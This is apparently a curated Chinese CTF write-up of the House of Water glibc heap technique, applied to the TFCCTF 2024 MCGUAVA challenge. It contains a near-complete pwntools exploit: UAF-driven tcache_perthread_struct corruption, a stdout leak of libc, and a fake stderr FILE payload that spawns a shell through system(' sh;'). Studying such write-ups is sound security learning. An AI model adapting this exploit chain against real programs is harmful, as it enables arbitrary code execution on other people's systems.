---
title: House of water + TFCCTF 2024 MCGUAVA
contest: TFCCTF
year: 2024
difficulty: hard
vuln_type: heap_exploit
tags: [House of Water, tcache_perthread_struct, UAF, FSOP, glibc 2.35]
attack_chain: |
  1. House of Water (Blue Water / udp_ctf 2024): 通过 UAF 把 tcache_perthread_struct 上 counts[0x3e0]=counts[0x3f0]=1 制造 size 0x10001 fake chunk
  2. 伪造 unsorted_start/unsorted_end 上方 0x30/0x20 fake chunk → 释放让 fd/bk 进入 tcache → 修改 unsorted 链表把 fake chunk 链入 unsorted bin
  3. 申请 size < 0x10000 的 chunk 触发 unsorted bin 遍历，fake chunk 落入 largebin 时 fd/bk 写入 libc 地址 → tcache_perthread_struct entries 区域留下 libc 指针
  4. TFCCTF 2024 MCGUAVA 实战: UAF 菜单 (申请 0x1791 / 释放不清零) + 堆切割法取 fake chunk 索引 + 1/16 爆破 heapbase 第 4 位
  5. 踩 libc 后改 tcache 0x240 entries 为 stdout 写 _IO_read_ptr → 0xfbad1800 触发 stdout 输出泄 libc
  6. 改 tcache 0x250 entries 为 _IO_2_1_stderr_ 写 fake file (vtable 指向 _IO_wfile_jumps / wide_data 指向 _IO_2_1_stderr_-0x40) → exit() 触发 _IO_wfile_overflow → system(" sh;")
key_payload: |
  fake_file = flat({
      0x0:  b" sh;",
      0x28: libc_base + libc.symbols['system'],
      0x88: libc_base + libc.symbols['_environ']-0x10,
      0xa0: libc_base + libc.symbols['_IO_2_1_stderr_']-0x40,
      0xD8: libc_base + libc.symbols['_IO_wfile_jumps'],
  }, filler=b"\x00")
one_liner: 把 tcache_perthread_struct 变成 unsorted bin 的玩法，让 fake chunk 的 fd/bk 把 libc 指针反向注入到 tcache entries 数组。
lesson: 任意大小 malloc + UAF 是 House of Water 的入场券；爆破 heapbase 第 4 位 1/16 成功率已经算很良心的现代 glibc 攻击。
quality: high
---

# House of water + TFCCTF 2024 MCGUAVA

> 来源: ctfiot.com 205266

## 一、House of Water 原理

由国际战队 blue water (udp_ctf / Water Paddler) 2024 年提出：在 UAF + 任意大小 malloc 的前提下，把 tcache_perthread_struct 内部挖空伪造出 size=0x10001 的 chunk，再把这个 fake chunk 链入 unsorted bin，让它走完 largebin 流程后留下 libc 指针。

**前置条件：**
- UAF 漏洞
- 可以申请足够大的堆块
- 不需要 leak

**核心 trick：**

```c
typedef struct tcache_perthread_struct {
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

`counts[0x3e0]` 和 `counts[0x3f0]` 是相邻 16-bit，当它们都被设为 1 时，16-bit 加 16-bit 加进位构成的 32-bit 视图正好是 `0x10001` —— 这就是 fake chunk size 的来源。

fake chunk 位置就在 tcache_perthread_struct 上方，正好盖住 0x20 和 0x30 的 tcache entries，伪造 unsorted_start / unsorted_end 上方 0x20 / 0x30 fake chunk → 释放进 tcache 后 fake chunk 的 fd/bk 自然指向 tcache entries 起始（这两个 entry 的"最后入链表 chunk 地址"刚好是 0x20/0x30 链表末节点）。

**fake unsorted chunk 链入 unsorted bin：** 把 unsorted_start 的 fd 改写为 fake chunk，unsorted_end 的 bk 也改写为 fake chunk，遍历时 fake chunk 出现在中间。再写 `prev_size=0x10000, size=0x20` 到 fake chunk+0x10000 让 unsorted bin 的 next-chunk 校验通过。

后续 `malloc(0x290)` 触发 unsorted bin 遍历：unsorted_start/end 送入 smallbin，fake chunk 送入 largebin 时 fd_nextsize/bk_nextsize 写 libc 地址 → tcache_perthread_struct entries 区域有 libc 指针 → 直接 `malloc(对应 size)` 拿到 libc 上的内存。

> 修改 fd/bk 指针时只能覆盖地址的低 3 位，从第 4 位开始是随机的 → 1/16 爆破

## 二、TFCCTF 2024 MCGUAVA 实战

题目是经典菜单 `guava()` add + `gius()` free，free 不清零 + 最大 0x1791 申请 + 没有 print/edit，正好是 House of Water 的入场券。

**踩 libc 流程：**

```python
# 1. 堆切割法获取 fake 0x30 + unsorted_start 索引
add(0x600); add(0x600); add(0x600); add(0x500)  # 7,8,9,10
free(7); free(8); free(9)
add(0x610); add(0x500)  # 11, 12=unsorted_start
free(11); free(12)
add(0x610, 0x608, p64(0x31))  # 13 在 unsorted_start 头部写 0x31
free(13); free(8)
add(0x610); add(0x500)  # 14, 15=unsorted_start
add(0x6e0)  # 16 防合并

# 同理伪造 unsorted_end 上方 0x20 fake chunk

# 2. 拿到 unsorted_middle 索引
add(0x500)  # 27 unsorted_middle
add(0x600)  # 28 防合并

# 3. 释放 0x3e8/0x3d8 两个 tcache，制造 0x10001 size
add(0x3e8); add(0x3d8)
free(29); free(30)

# 4. 恢复 unsorted_start/end 的 size 位
add(0x330, 0x18, p64(0x511))
free(39)
add(0x340, 0x18, p64(0x511))
free(40)

# 5. 写 next chunk prev_size/size 绕过 unsorted bin 校验
add(0x210)
add(0x30, 0x20, p64(0x10000)+p64(0x20))

# 6. 释放进 unsorted bin，1/16 爆破替换 fake chunk
add(0x238); add(0x248)  # 78,79
free(78); free(79)
free(25); free(27); free(15)  # end/middle/start
add(0x330, 0x20, p16(0x0080))  # 改 unsorted_start.fd
free(80)
add(0x340, 0x28, p16(0x0080))  # 改 unsorted_end.bk
free(81)

# 7. 把 largebin 多余的申请出来，tcache 上踩上 libc 地址
add(0x500)  # 82
add(0x500)  # 83

# 8. 改 0x240 tcache entries 为 stdout
add(0x100, 0, p16(0x2780))  # 84
add(0x100, 0, p16(0x2780))  # 85
add(0x230, 0, p64(0xfbad1800)+p64(0)*3+b'\x00\x00')  # 86
p.recvuntil(b'\x7f', timeout=1)
libc_base = u64(p.recvuntil(b'\x7f', timeout=1)[-6:].ljust(8, b'\x00')) - 0x219aa0

# 9. 改 0x250 tcache entries 为 _IO_2_1_stderr_ 写 fake file
free(86)
add(0x100, 0x8, p64(libc_base+libc.symbols['_IO_2_1_stderr_']))
fake_file = flat({
    0x0:  b" sh;",
    0x28: libc_base + libc.symbols['system'],
    0x88: libc_base + libc.symbols['_environ']-0x10,
    0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40,
    0xD8: libc_base + libc.symbols['_IO_wfile_jumps'],
}, filler=b"\x00")
# exit() 触发 _IO_wfile_overflow → system(" sh;")
```

## 评价

是少数把 House of Water 完整打通的实站记录：从原理讲解到 how2heap 调试再到 TFCCTF 2024 真题，作者 csome 把 0x10001 fake chunk size 的来源 (counts[0x3e0]/counts[0x3f0] 相加进位) 讲得非常清楚。

实站 exp 标注"写的比较乱且注释上对堆块的标号有点不太准确"——确实，但堆块序号注释本身就给得很详细（#7 是 fake 0x30、#8 是 unsorted_start、#13 是改 size 位的临时块），仍然可读。
